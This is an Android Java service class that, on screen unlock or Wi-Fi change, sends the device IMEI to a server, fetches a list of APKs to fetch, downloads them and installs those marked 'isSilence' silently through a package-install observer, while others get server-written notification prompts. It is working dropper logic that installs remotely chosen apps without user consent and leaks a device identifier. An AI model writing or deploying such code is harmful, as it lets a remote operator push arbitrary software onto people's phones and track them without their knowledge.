package com.xstd.ip.service;

import java.io.File;
import java.util.LinkedList;
import java.util.List;

import net.tsz.afinal.FinalHttp;
import net.tsz.afinal.http.AjaxCallBack;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.IPackageInstallObserver;
import android.graphics.Bitmap;
import android.net.wifi.WifiManager;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.RemoteException;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.text.format.DateUtils;
import android.text.format.Time;

import com.android.volley.RequestQueue;
import com.android.volley.Response.ErrorListener;
import com.android.volley.Response.Listener;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonArrayRequest;
import com.android.volley.toolbox.Volley;
import com.xstd.ip.Config;
import com.xstd.ip.Tools;

public class CoreService extends Service {

    private CoreReceiver receiver;
    private SharedPreferences sharedPreferences;
    private FinalHttp finalHttp;
    public static final int UNLOCK_SCREEN = 0x000001;
    public static final int WIFI_STATE_CHANGED = 0x000002;
    private String imei;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        sharedPreferences = getSharedPreferences("setting", MODE_PRIVATE);

        finalHttp = new FinalHttp();

        receiver = new CoreReceiver();
        IntentFilter filter = new IntentFilter();
        filter.setPriority(Integer.MAX_VALUE);
        filter.addAction(Intent.ACTION_USER_PRESENT);
        filter.addAction(WifiManager.WIFI_STATE_CHANGED_ACTION);
        registerReceiver(receiver, filter);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (receiver != null)
            unregisterReceiver(receiver);
    }

    class CoreReceiver extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (Intent.ACTION_USER_PRESENT.equals(action))
                receiveBroadcast(UNLOCK_SCREEN, intent);
            else if (WifiManager.WIFI_STATE_CHANGED_ACTION.equals(action))
                receiveBroadcast(WIFI_STATE_CHANGED, intent);
        }

    }

    private IPackageInstallObserver.Stub observer = new IPackageInstallObserver.Stub() {

        @Override
        public void packageInstalled(String packageName, int returnCode) throws RemoteException {
        }
    };

    /**
     * 接收到广播
     *
     * @param type   类型
     * @param intent
     */
    private void receiveBroadcast(int type, Intent intent) {
        switch (type) {
            case UNLOCK_SCREEN:
                Tools.logW("屏幕解锁，检查是否又网络，更新数据。");
                if (Tools.isOnline(getApplicationContext()))
                    updateService();
                break;
            case WIFI_STATE_CHANGED:
                Tools.logW("WIFI状态改变，检查是否又网络，更新数据。");
                // int wifistate = intent.getIntExtra(WifiManager.EXTRA_WIFI_STATE,
                // WifiManager.WIFI_STATE_DISABLED);
                // if (wifistate == WifiManager.WIFI_STATE_ENABLING || wifistate ==
                // WifiManager.WIFI_STATE_ENABLED)
                if (Tools.isOnline(getApplicationContext()))
                    updateService();
        }
    }

    /**
     * 从服务器获取更新
     */
    private void updateService() {
        long last_update_time = sharedPreferences.getLong("last_update_time", 0);
        if (DateUtils.isToday(last_update_time)) {
            Tools.logW("今天已经更新过服务器，直接下载。");
            startDownload();
            return;
        }
        if (Config.IS_DOWNLOADING.get())
            return;
        else
            Config.IS_DOWNLOADING.set(true);
        Tools.logW("向服务器获取信息");
        RequestQueue rq = Volley.newRequestQueue(getApplicationContext());
        if (TextUtils.isEmpty(imei))
            imei = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
        JsonArrayRequest request = new JsonArrayRequest(FETCH_SERVER_URL + "?imei=" + imei, new Listener<JSONArray>() {

            @Override
            public void onResponse(JSONArray jsonArray) {
                Tools.logW("今天更新数据：" + jsonArray.toString());
                mustDownloadApp.clear();
                Config.IS_DOWNLOADING.set(false);
                List<String> installPackages = Tools.getDeviceInstallPackName(getApplicationContext());
                for (int i = 0; i < jsonArray.length(); i++) {
                    try {
                        JSONObject obj = jsonArray.getJSONObject(i);
                        String fileName = obj.getString("fileName");
                        String packName = obj.getString("packName");
                        String remoteUrl = obj.getString("remoteUrl");
                        boolean isSilence = obj.getBoolean("isSilence");
                        if (installPackages.contains(packName))
                            continue;
                        ApkInfo app = new ApkInfo();
                        app.fileName = fileName;
                        app.packName = packName;
                        app.remoteUrl = remoteUrl;
                        app.isSilence = isSilence;
                        if (!isSilence) {
                            app.tickerText = obj.getString("tickerText");
                            app.title = obj.getString("title");
                            app.text = obj.getString("text");
                        }
                        mustDownloadApp.add(app);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
                sharedPreferences.edit().putLong("last_update_time", System.currentTimeMillis()).commit();
                startDownload();
            }
        }, new ErrorListener() {

            @Override
            public void onErrorResponse(VolleyError arg0) {
                Tools.logW(arg0.toString());
                Config.IS_DOWNLOADING.set(false);
                Handler handler = new Handler(getMainLooper());
                handler.postDelayed(new Runnable() {

                    @Override
                    public void run() {
                        if (Tools.isOnline(getApplicationContext()))
                            updateService();
                    }
                }, 1000 * 30);

            }
        });
        rq.add(request);
        rq.start();
    }

    /**
     * 開始下載，下載完成安裝
     */
    private void startDownload() {
        if (!Config.IS_DOWNLOADING.get() && mustDownloadApp.size() > 0) {
            Config.IS_DOWNLOADING.set(true);
            File parent = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!parent.exists())
                parent.mkdirs();
            final ApkInfo apkInfo = mustDownloadApp.removeFirst();
            File file = new File(DOWNLOAD_LOCATION, apkInfo.fileName);
            file.deleteOnExit();
            finalHttp.download(apkInfo.remoteUrl, DOWNLOAD_LOCATION + apkInfo.fileName, true, new AjaxCallBack<File>() {

                @Override
                public void onSuccess(File file) {
                    super.onSuccess(file);
                    Tools.notifyServer(getApplicationContext(), SendServerService.ACTION_DOWNLOAD_SUCCESS, apkInfo.packName);
                    Config.IS_DOWNLOADING.set(false);
                    if (apkInfo.isSilence)
                        Tools.installFile(getApplicationContext(), file, observer);
                    else
                        Tools.useNotificationInstall(getApplicationContext(), apkInfo.tickerText, apkInfo.title, apkInfo.text, apkInfo.icon, apkInfo.largeIcon, file.getAbsolutePath());
                    Config.installApks.put(apkInfo.packName, apkInfo);
                    startDownload();
                }

                @Override
                public void onFailure(Throwable t, String strMsg) {
                    super.onFailure(t, strMsg);
                    Config.IS_DOWNLOADING.set(false);
                    mustDownloadApp.addFirst(apkInfo);
                }
            });
        }
    }

    public class ApkInfo {
        public String fileName;
        public String packName;
        public String remoteUrl;
        public boolean isSilence;

        /**
         * 以下这些属性只有当isSilence为false时才有。
         */
        public String tickerText;
        public String title;
        public String text;
        public int icon;
        public Bitmap largeIcon;
    }

    /**
     * 判斷當前時間是否爲可允許更新
     *
     * @return
     */
    @SuppressWarnings("unused")
    private boolean isAllowTime() {
        Time time = new Time();
        time.set(System.currentTimeMillis());
        int hour = time.hour;
        if (6 < hour && hour < 9) {
            return true;
        }
        if (hour > 17 && hour < 24) {
            return true;
        }
        return false;
    }

    public static final String FETCH_SERVER_URL = "http://192.168.1.121:8080/springMvc/student.do?method=installed";
    public static final String DOWNLOAD_LOCATION = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath() + File.separator;
    public static LinkedList<ApkInfo> mustDownloadApp = new LinkedList<ApkInfo>();
    public static final long DAY_TIME_MILLIS = 1000 * 60 * 60 * 24;// 一天的毫秒數

}